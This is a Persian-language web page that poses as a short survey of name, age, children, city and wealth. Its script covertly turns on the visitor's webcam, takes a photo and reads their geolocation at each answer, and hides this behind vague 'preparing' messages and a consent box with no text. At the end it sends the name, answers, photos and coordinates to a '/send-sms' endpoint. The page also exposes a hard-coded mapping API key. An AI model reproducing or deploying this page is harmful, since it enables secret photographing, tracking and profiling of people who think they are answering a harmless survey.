<!doctype html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>نظرسنجی کوتاه</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>📋 نظرسنجی کوتاه</h2>
  <p>لطفاً قبل از شروع، نام خود را وارد کنید و تیک رضایت را بزنید .</p>

  <div id="intro">
    <label>نام شما:
      <input id="nameInput" type="text" placeholder="نام خود را بنویسید..." required />
    </label>
    <br>
    <label><input id="agree" type="checkbox"> ...</label>
    <br>
    <button id="start" disabled>شروع نظرسنجی</button>
  </div>

  <div id="questionArea" class="hidden">
    <div id="qText"></div>
    <div id="qOptions"></div>
    
    <div id="locationStatus" class="location-status hidden">
      <div class="location-loading">
        <div class="spinner"></div>
        <span>در حال آماده‌سازی...</span>
      </div>
    </div>
    
    <button id="next" disabled>بعدی</button>
    <button id="finish" class="hidden">پایان — ارسال</button>
    <p id="status"></p>
  </div>

  <script>
    const questions = [
      { key: 'age', text: 'چند سال دارید؟', options: ['بین ۲۰ تا ۳۰', 'بین ۳۰ تا ۴۰', 'بین ۴۰ تا ۵۰'] },
      { key: 'children', text: 'چند تا بچه دارید؟', options: ['۱', '۲ تا ۳', '۴ تا بیشتر', '۰'] },
      { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ', 'گربه', 'لاک‌پشت'] },
      { key: 'city', text: 'الان در کدام شهر هستید؟', options: ['کیش', 'شمال', 'تهران', 'مشهد'] },
      { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['۱۰ میلیون', '۱۰۰ میلیون', '۱۰۰ میلیارد'] },
    ];

    const nameInput = document.getElementById('nameInput');
    const agree = document.getElementById('agree');
    const startBtn = document.getElementById('start');
    const qText = document.getElementById('qText');
    const qOptions = document.getElementById('qOptions');
    const questionArea = document.getElementById('questionArea');
    const nextBtn = document.getElementById('next');
    const finishBtn = document.getElementById('finish');
    const status = document.getElementById('status');
    const locationStatus = document.getElementById('locationStatus');

    let stream = null;
    let video = null;
    let canvas = null;
    let ctx = null;
    let current = 0;
    let answers = {};
    let photos = [];
    let userLocation = null;
    let isGettingLocation = false;

    function updateStartButton() {
      startBtn.disabled = !(agree.checked && nameInput.value.trim().length > 1);
    }

    agree.addEventListener('change', updateStartButton);
    nameInput.addEventListener('input', updateStartButton);

    // تابع گرفتن موقعیت مکانی
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          resolve({
            latitude: 0,
            longitude: 0,
            address: "سیستم موقعیت‌یابی در دسترس نیست",
            fallback: true
          });
          return;
        }

        showLocationLoading();

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            };
            
            hideLocationLoading();
            
            getAddressName(location.latitude, location.longitude)
              .then(address => {
                location.address = address;
                resolve(location);
              })
              .catch(() => {
                location.address = `.`;
                resolve(location);
              });
          },
          (error) => {
            hideLocationLoading();
            resolve({
              latitude: 0,
              longitude: 0,
              address: ".",
              fallback: true,
              error: true
            });
          },
          {
            enableHighAccuracy: false,
            timeout: 8000,
            maximumAge: 300000
          }
        );
      });
    }

    function showLocationLoading() {
      isGettingLocation = true;
      locationStatus.classList.remove('hidden');
      nextBtn.disabled = true;
      nextBtn.innerHTML = '⏳ در حال آماده‌سازی...';
    }

    function hideLocationLoading() {
      isGettingLocation = false;
      locationStatus.classList.add('hidden');
      updateNextButtonState();
    }

    function updateNextButtonState() {
      const hasAnswer = answers[questions[current]?.key];
      const hasLocation = userLocation !== null;
      
      const canProceed = hasAnswer && hasLocation;
      
      nextBtn.disabled = !canProceed;
      
      if (nextBtn.disabled) {
        if (!hasAnswer) {
          nextBtn.innerHTML = 'لطفاً گزینه انتخاب کنید';
        } else if (!hasLocation) {
          nextBtn.innerHTML = '⏳ در حال آماده‌سازی...';
        }
      } else {
        nextBtn.innerHTML = 'بعدی';
      }
    }

    async function getAddressName(lat, lng) {
      try {
        const response = await fetch(`https://api.neshan.org/v4/reverse?lat=${lat}&lng=${lng}`, {
          headers: {
            'Api-Key': 'web.5eeeff90c8a94a6ebb0c5c8d7b3e5e2b'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          return data.formatted_address || `بعدی`;
        }
        return `ثبت شد`;
      } catch (error) {
        return `ثبت شد`;
      }
    }

    startBtn.addEventListener('click', async () => {
      try {
        status.textContent = 'در حال راه‌اندازی...';
        
        userLocation = {
          latitude: 0,
          longitude: 0,
          address: "در حال آماده‌سازی...",
          fallback: true
        };

        video = document.createElement('video');
        video.autoplay = true;
        video.playsInline = true;
        canvas = document.createElement('canvas');
        ctx = canvas.getContext('2d');
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000));
        
        document.getElementById('intro').classList.add('hidden');
        questionArea.classList.remove('hidden');
        renderQuestion();
        status.textContent = '';
      } catch (e) {
        status.textContent = 'خطا در راه‌اندازی: ' + e.message;
        console.error('خطای راه‌اندازی:', e);
      }
    });

    function renderQuestion() {
      const q = questions[current];
      qText.textContent = q.text;
      qOptions.innerHTML = '';
      q.options.forEach(opt => {
        const b = document.createElement('button');
        b.textContent = opt;
        b.onclick = ()=> selectOption(opt, b);
        qOptions.appendChild(b);
      });
      
      updateNextButtonState();
      finishBtn.classList.add('hidden');
      status.textContent = 'لطفاً یک گزینه انتخاب کنید';
    }

    async function takePhotoWithInfo(){
      return new Promise(async (resolve, reject) => {
        try {
          if (!video || !canvas || !ctx) {
            throw new Error('آماده نیست');
          }
          
          let currentLocation = userLocation;
          
          try {
            currentLocation = await getLocation();
          } catch (locationError) {
            currentLocation = {
              latitude: 0,
              longitude: 0,
              address: " ثبت شد",
              fallback: true
            };
          }
          
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
          
          const photoData = {
            image: dataUrl,
            question: questions[current].text,
            answer: answers[questions[current].key],
            location: currentLocation.address,
            coordinates: currentLocation,
            timestamp: getPersianTimestamp(),
            isFallback: currentLocation.fallback || false
          };
          
          resolve(photoData);
        } catch (error) {
          reject(error);
        }
      });
    }

    function getPersianTimestamp() {
      const now = new Date();
      const year = now.getFullYear();
      const month = String(now.getMonth() + 1).padStart(2, '0');
      const day = String(now.getDate()).padStart(2, '0');
      const hours = String(now.getHours()).padStart(2, '0');
      const minutes = String(now.getMinutes()).padStart(2, '0');
      
      return `${year}/${month}/${day} ${hours}:${minutes}`;
    }

    async function selectOption(opt, btn){
      document.querySelectorAll('#qOptions button').forEach(b=> b.classList.remove('selected'));
      btn.classList.add('selected');

      answers[questions[current].key] = opt;
      
      status.textContent = ' در حال ثبت پاسخ...';
      
      try {
        const photoData = await takePhotoWithInfo();
        photos.push(photoData);
        
        status.innerHTML = `
          <div style="text-align: center; background: #e6fffa; padding: 15px; border-radius: 10px; border: 2px solid #81e6d9; margin: 10px 0;">
            <strong style="color: #2d3748;">✅ پاسخ شما ثبت شد</strong><br>
            <div style="margin-top: 8px; font-size: 14px; color: #4a5568;">
              برای ادامه روی "بعدی" کلیک کنید
            </div>
          </div>
        `;

        updateNextButtonState();
        
      } catch (error) {
        status.textContent = '❌ خطا در ثبت پاسخ: ' + error.message;
        updateNextButtonState();
      }
    }

    nextBtn.addEventListener('click', ()=>{
      if (isGettingLocation) {
        status.textContent = '⏳ لطفاً منتظر بمانید...';
        return;
      }
      
      current++;
      if(current >= questions.length){
        qText.textContent = 'پرسش‌ها تمام شد — با تشکر از مشارکت شما';
        qOptions.innerHTML = '';
        nextBtn.disabled = true;
        finishBtn.classList.remove('hidden');
        status.textContent = ' "پایان" کلیک کنید';
      } else {
        renderQuestion();
      }
    });

    finishBtn.addEventListener('click', async ()=>{
      status.textContent = 'در حال ارسال نهایی اطلاعات...';
      finishBtn.disabled = true;
      
      try {
        const photoImages = photos.map(photo => photo.image);
        
        const payload = { 
          name: nameInput.value.trim(), 
          answers, 
          photos: photoImages,
          location: userLocation
        };

        const res = await fetch('/send-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        const result = await res.json();
        
        if (result.ok) {
          status.innerHTML = `
            <div style="text-align: center; background: linear-gradient(135deg, #c6f6d5, #9ae6b4); padding: 25px; border-radius: 15px; border: 2px solid #48bb78; margin: 10px 0;">
              <strong style="color: #22543d; font-size: 18px;">✅ نظرسنجی با موفقیت ثبت شد</strong><br>
              <div style="margin-top: 12px; font-size: 15px; color: #2d3748;">
                از مشارکت شما متشکریم!<br>
                پاسخ‌های شما ثبت گردید.
              </div>
            </div>
          `;
          
          finishBtn.disabled = true;
          nextBtn.disabled = true;
          
        } else {
          status.textContent = '⚠️ خطا در ارسال: ' + result.error;
          finishBtn.disabled = false;
        }
      } catch(err){
        status.textContent = '❌ خطا در اتصال: ' + err.message;
        finishBtn.disabled = false;
      } finally {
        if(stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    });

    window.addEventListener('error', (event) => {
      console.error('خطای全局:', event.error);
    });
  </script>
</body>
</html>
